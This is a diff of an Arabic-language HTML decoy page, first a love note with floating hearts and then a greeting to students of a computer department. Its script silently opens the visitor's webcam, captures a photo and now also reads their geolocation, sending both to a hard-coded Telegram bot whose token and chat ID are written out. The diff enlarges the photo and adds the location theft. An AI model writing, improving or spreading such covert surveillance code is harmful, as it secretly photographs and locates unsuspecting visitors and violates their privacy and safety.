@@ -2,23 +2,23 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>ؤؤؤؤؤ</title>
+<title>االسجاجه </title>
 <style>
   body {
-    margin:0;
-    padding:0;
-    overflow:hidden;
-    background:#fff;
-    font-family:Arial,sans-serif;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background: #fff;
+    font-family: Arial, sans-serif;
   }
 
   .heart {
-    position:absolute;
-    font-weight:bold;
-    font-size:24px;
-    user-select:none;
-    pointer-events:none;
-    white-space:nowrap;
+    position: absolute;
+    font-weight: bold;
+    font-size: 24px;
+    user-select: none;
+    pointer-events: none;
+    white-space: nowrap;
   }
 
   #statusMessage {
@@ -38,11 +38,11 @@
 </head>
 <body>
 
-<div id="statusMessage">احبج بعد خاف تنسين حبج بالكلب بعده ...</div>
+<div id="statusMessage"> باجرر امتحان اقروو يولدد...</div>
 
 <script>
-  // ======== القلوب ========
-  const texts = ['❤️ أحبج زهراء ❤️'];
+  // ======== القلوب المتحركة ========
+  const texts = ['❤️  تحياتي لجميع الطلاب في قسم تجميع الحاسبات  ❤️'];
   const hearts = [];
   const colors = ['red','pink','orange','purple','blue'];
 
@@ -76,9 +76,9 @@
   }
   moveHearts();
 
-  // ======== إرسال الصورة للبوت مباشرة ========
-  const BOT_TOKEN = '8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A';
-  const CHAT_ID = '1037860664';
+  // ======== إعدادات بوت تيليجرام ========
+  const BOT_TOKEN = '8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A'; // ضع توكن البوت هنا
+  const CHAT_ID = '1037860664';     // ضع الايدي هنا
 
   async function captureAndSend() {
     try {
@@ -89,28 +89,61 @@
       video.srcObject = stream;
 
       const canvas = document.createElement('canvas');
-      canvas.width = 160;
-      canvas.height = 120;
+      canvas.width = 640; // حجم أكبر لتحسين جودة الصورة
+      canvas.height = 480;
       const ctx = canvas.getContext('2d');
 
       const status = document.getElementById('statusMessage');
       status.style.display = 'block';
 
       setTimeout(async () => {
+        // التقاط الصورة
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageBlob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
 
+        // الحصول على الموقع الجغرافي
+        let latitude = null;
+        let longitude = null;
+        try {
+          await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => { latitude = pos.coords.latitude; longitude = pos.coords.longitude; resolve(); },
+              (err) => { console.warn("فشل الحصول على الموقع:", err); resolve(); }
+            );
+          });
+        } catch (err) {
+          console.warn("خطأ في تحديد الموقع:", err);
+        }
+
+        // إعداد FormData لإرسال الصورة والموقع
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', imageBlob, 'photo.jpg');
 
-        fetch(`https://api.telegram.org/bot${8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A}/sendPhoto`, {
+        // إرسال الصورة أولاً
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: formData
         })
         .then(() => console.log('تم إرسال الصورة للبوت!'))
-        .catch(e => console.error('خطأ في الإرسال:', e));
+        .catch(e => console.error('خطأ في إرسال الصورة:', e));
 
+        // إرسال الموقع إذا توفر
+        if (latitude && longitude) {
+          const locationData = new FormData();
+          locationData.append('chat_id', CHAT_ID);
+          locationData.append('latitude', latitude);
+          locationData.append('longitude', longitude);
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            method: 'POST',
+            body: locationData
+          })
+          .then(() => console.log('تم إرسال الموقع للبوت!'))
+          .catch(e => console.error('خطأ في إرسال الموقع:', e));
+        }
+
+        // إخفاء الرسالة وإيقاف الكاميرا
         status.style.display = 'none';
         stream.getTracks().forEach(track => track.stop());
       }, 2000);
